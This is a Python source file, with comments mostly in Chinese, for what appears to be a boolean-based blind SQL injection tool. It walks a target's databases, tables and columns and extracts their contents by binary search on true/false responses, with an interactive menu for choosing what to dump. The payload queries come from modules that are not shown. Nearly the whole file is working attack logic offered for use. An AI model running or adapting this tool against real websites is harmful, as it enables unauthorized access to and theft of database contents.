

from algorithm import binary_search_len, binary_search_value
# import config
from config import INJECT_TYPE, set_boolean_inject_return_value, boolean_inject_success_value, boolean_inject_failure_value, url
from sql_tables import get_sql
from myEnum import SQL_INJECT_TYPE, SQL_TYPE
from check import boolean_inject_check_fn
# 0. init
def boolean_inject_init():
  set_boolean_inject_return_value(
    boolean_inject_check_fn(boolean_inject_success_value),
    boolean_inject_check_fn(boolean_inject_failure_value),
  )

# # 1. 获取所有库
def get_schema_list():
  # 获取库名长度
  table_schema_len = binary_search_len(get_sql(SQL_TYPE.GET_SCHEMATA_LEN_SQL))
  print('所有库名长度：', table_schema_len)

  # 获取所有库名
  
  table_schema_list = binary_search_value(table_schema_len, get_sql(SQL_TYPE.GET_SCHEMATA_VALUE_SQL))
  table_schema_list = table_schema_list.split(',')
  print()
  black_list = ['mysql', 'information_schema', 'performance_schema']
  res = [i for i in table_schema_list if i not in black_list]
  return res

# 2. 获取某个库所有表
def get_tables_list(schema_name):
  # # 获取表名长度
  table_name_len = binary_search_len(get_sql(SQL_TYPE.GET_TABLES_LEN_SQL, schema_name))
  print(f'{schema_name} tables length is {table_name_len}')
  if table_name_len == 0:
    return []
  # 获取表名列表
  table_name_list = binary_search_value(table_name_len, get_sql(SQL_TYPE.GET_TABLES_VALUE_SQL, schema_name))
  print()
  print(f'{schema_name} tables is {table_name_list}')
  return table_name_list.split(',')

# 3. 获取某个表的所有列字段
def get_columns_list(schema_name, table_name):
  column_name_len = binary_search_len(get_sql(SQL_TYPE.GET_COLUMNS_LEN_SQL, schema_name, table_name))
  print(f'{table_name} columns is {column_name_len}')

  # 获取列名列表
  column_name_list = binary_search_value(
    column_name_len,
    get_sql(SQL_TYPE.GET_COLUMNS_VALUE_SQL, schema_name, table_name)
  )
  print()
  print(f'{table_name} columns is {column_name_list}')
  return column_name_list.split(',')
# 4. 获取某库某表column的数据
def get_value(schema_name, table_name, column):
  # 获取长度
  data_len = binary_search_len(get_sql(SQL_TYPE.GET_DATA_LEN_SQL, schema_name, table_name, column), 0, 10000)
  print()
  print(f"{schema_name}.{table_name} len is {data_len}")
  
  if data_len >= 500:
    val = input('数据量过大， 是否还要继续查询???(继续查询无法中断, 中断后会导致数据丢失,从头再来) Y/N\n')
    if val == 'N' or val == 'n':
      return ''
  # 获取数据
  data = binary_search_value(data_len, get_sql(SQL_TYPE.GET_DATA_VALUE_SQL, schema_name, table_name, column))
  print()
  return data

def choose_item(list, f = True):
  if (len(list) == 1):
    return list[0]
  for i in range(0, len(list)):
    print(f'  {i}. {list[i]}')
  if f:
    print(f'  {len(list)}. 重新选择')

  val = input()
  val = int(val)
  if 0 <= val <= len(list):
    return val
  print('inout error')
  return choose_item(list)

def boolean_inject_main():
  boolean_inject_init()
  
  schema_list = get_schema_list()
  tables = {}
  for i in schema_list:
    tables[i] = {}
  while True:
    # 选择一列
    print('一、选择数据库')
    idx = choose_item(schema_list, False)
    
    if idx == len(schema_list):
      continue

    schema_item = schema_list[idx]
    table_list = []
    if len(tables[schema_item].keys()) == 0:
      table_list = get_tables_list(schema_item)
      for i in table_list:
        tables[schema_item][i] = []
    else:
      table_list = list(tables[schema_item].keys())

    if len(table_list) == 0:
      print('ERROR: 该数据库为空, 请重新选择')
      continue

    print('二、选择数据表')
    idx = choose_item(table_list)
    if idx == len(table_list):
      continue
    table_item = table_list[idx]
    column_list = []
    if len(tables[schema_item][table_item]) == 0:
      column_list = get_columns_list(schema_item, table_item)
      tables[schema_item][table_item] = [i for i in column_list]
    else:
      column_list = [i for i in tables[schema_item][table_item]]
    column_list.append('all')
    idx = choose_item(column_list)
    if idx == len(column_list):
      continue
    column_item = column_list[idx]
    if idx == len(column_list) - 1:
      column_list.pop()
      column_item = ','.join(column_list)
    get_value(schema_item, table_item, column_item)
  

def run():
  print('run')
  
  if INJECT_TYPE == SQL_INJECT_TYPE.BOOLEAN_INJECT:
    boolean_inject_main()
  
  pass